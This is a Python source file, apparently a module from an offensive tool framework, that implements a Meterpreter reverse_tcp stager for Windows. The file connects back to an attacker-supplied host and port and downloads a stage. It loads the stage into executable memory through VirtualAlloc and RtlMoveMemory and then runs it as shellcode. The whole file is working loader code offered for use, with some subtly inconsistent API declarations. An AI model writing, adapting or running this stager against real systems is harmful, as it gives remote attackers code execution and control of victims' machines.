from utils.helper import nstate as nstate
#from utils.helper import CheckFile, GetFileHash
from time import sleep
import ctypes.wintypes
import socket
import struct
import ctypes

CATEGORY = 'stager'

def register_arguments(parser):
    parser.add_argument('-a', '--arch', choices=['x64', 'x86'], default='x64', type=str, help= 'Architecture to use, x64 is the default')
    parser.add_argument('-p', '--port', default=4444, type=int, required=True, help='Remote port to connect to')
    parser.add_argument('-r', '--remote-host', type=str, required=True, help='Remote host to connect to')
    parser.add_argument('-s', '--sleep', default=0, type=int, required=True, help='Sleep for x seconds before the stage is executed')
    parser.add_argument('-t', '--timeout', default=30, type=int, help='Connect timeout in seconds, 30 seconds is the default')

class stage():
    
    Author          = 'raptor@0xdeadbeef.info, psycore8'
    Description     = 'Connect back (reverse_tcp) to remote host and receive a stage'
    Version         = '1.1.0'
    DisplayName      = 'METERPRETER-STAGER'
    payload         = any
    payload_size    = int
    sock            = any

    def __init__(self, remote_host=str, remote_port=int, timeout=int, architecture=str, sleeptime=int):
        self.remote_host = remote_host
        self.remote_port = remote_port
        self.timeout = timeout
        self.architecture = architecture
        self.sleeptime = sleeptime

    def msg(self, message_type, ErrorExit=False):
        messages = {
            'pre.head'      : f'{nstate.FormatModuleHeader(self.DisplayName, self.Version)}\n',
            'proc.sock'     : f'{nstate.s_note} Creating Socket...',
            'proc.con'      : f'{nstate.s_ok} Connection established',
            'proc.stage'    : f'{nstate.s_note} Download stage...',
            'proc.size'     : f'{nstate.s_note} Payload size: {self.payload_size} bytes',
            'proc.stage_ok' : f'{nstate.s_ok} Stage downloaded!',
            'proc.exec'     : f'{nstate.s_note} Trying to execute Meterpreter stage...',
            'inj.alloc'     : f'{nstate.s_ok} Memory allocated!',
            'inj.sleep'     : f'{nstate.s_info} Let\'s take a nap for {self.sleeptime} seconds',
            'inj.exec'      : f'{nstate.s_note} Execute payload...',
            'inj.ok'        : f'{nstate.s_ok} Looks good!',
            'inj.fail'      : f'{nstate.s_fail} Payload not executed',
            'post.done'     : f'{nstate.s_ok} DONE!',
            'error.con'     : f'{nstate.s_fail} Connevtion failed',
            'error.stage_ok': f'{nstate.s_fail} Error during download'
        }
        print(messages.get(message_type, f'{message_type} - this message type is unknown'))
        if ErrorExit:
            exit()

    def CreateSocket(self):
        #print(f'{nstate.OKBLUE} Creating Socket...')
        self.msg('proc.sock')
        socket.setdefaulttimeout(self.timeout)
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #self.sock.connect((self.remote_host, self.remote_port))
        con = self.sock.connect_ex((self.remote_host, self.remote_port))
        if con == 0:
            self.msg('proc.con')
            #print(f'{nstate.OKGREEN} Connection established')
        else:
            self.msg('error.con')
            #print(f'{nstate.FAIL} Connevtion failed')

    def ReceivePayload(self):
        # get 4-byte payload length
        l = struct.unpack("@I", self.sock.recv(4))[0]

        # download payload
        self.msg('proc.stage')
        #print(f'{nstate.OKBLUE} Download stage...')
        d = self.sock.recv(l)
        while len(d) < l:
            d += self.sock.recv(l - len(d))
        self.payload_size = len(d)
        self.msg('proc.size')
        #print(f'{nstate.OKBLUE} Payload size: {len(d)} bytes')

        if self.architecture == 'x64':
            self.payload = bytearray(
                b"\x48\xbf"
                + self.sock.fileno().to_bytes(8, byteorder="little")
                + d)
        elif self.architecture == 'x86':
            self.payload = bytearray(
                    b"\xbf"
                    + self.sock.fileno().to_bytes(4, byteorder="little")
                    + d)
        if self.payload:
            self.msg('proc.stage_ok')
            #print(f'{nstate.OKGREEN} Stage downloaded!')
        else:
            self.msg('error.stage_ok', True)
            #print(f'{nstate.FAIL} Error during download')
            
    def LaunchStage(self):
        self.msg('proc.exec')
        #print(f'{nstate.OKBLUE} Trying to execute Meterpreter stage...')
        MEM_COMMIT_RESERVE = 0x00003000
        PAGE_READWRITE_EXECUTE = 0x00000040

        kernel32 = ctypes.windll.kernel32

        VirtualAlloc = kernel32.VirtualAlloc
        VirtualAlloc.argtypes = [ctypes.wintypes.LPVOID, ctypes.c_size_t, ctypes.wintypes.DWORD, ctypes.wintypes.DWORD]
        VirtualAlloc.restype = ctypes.wintypes.LPVOID

        RtlMoveMemory = kernel32.RtlMoveMemory
        RtlMoveMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t]
        RtlMoveMemory.restype = None

        CreateThread = kernel32.CreateThread
        CreateThread.argtypes = [ctypes.c_int, ctypes.c_size_t, ctypes.c_int, ctypes.c_int, ctypes.wintypes.DWORD, ctypes.c_int]
        CreateThread.restype = None

    #     WaitForSingleObject = kernel32.WaitForSingleObject
    #     WaitForSingleObject.argtypes = [ctypes.wintypes.HANDLE, ctypes.wintypes.DWORD]
    #     WaitForSingleObject.restype = None

        ptr = VirtualAlloc(0, len(self.payload), MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)

        #print(f'Pointer: {ptr}')
        #print(f'{len(self.payload)}')
        if ptr:
            self.msg('inj.alloc')
            #print(f'{nstate.OKGREEN} Memory allocated!')
            buf = (ctypes.c_char * len(self.payload)).from_buffer(self.payload)
            RtlMoveMemory(ptr, buf, len(self.payload))

        if self.sleeptime > 0:
            self.msg('inj.sleep')
            #print(f'{nstate.INFO} Let\'s take a nap for {self.sleeptime} seconds')
            sleep(self.sleeptime)

        # execute the shellcode
        ptr_f = ctypes.cast(ptr, ctypes.CFUNCTYPE(ctypes.c_void_p))
        ptr_f()
        
        self.msg('inj.exec')
        #print(f'{nstate.OKBLUE} Execute payload...')
        ht = CreateThread(0, 0, ptr, 0, 0, ctypes.pointer(0))
        if ht:
            self.msg('inj.ok')
        else:
            self.msg('inj.fail', True)
        ctypes.windll.kernel32.WaitForSingleObject(
                ctypes.c_int(ht),
                ctypes.c_int(-1))
    #     WaitForSingleObject(ht, -1)    

    def process(self):
        self.msg('pre.head')
        self.CreateSocket()
        self.ReceivePayload()
        self.LaunchStage()

    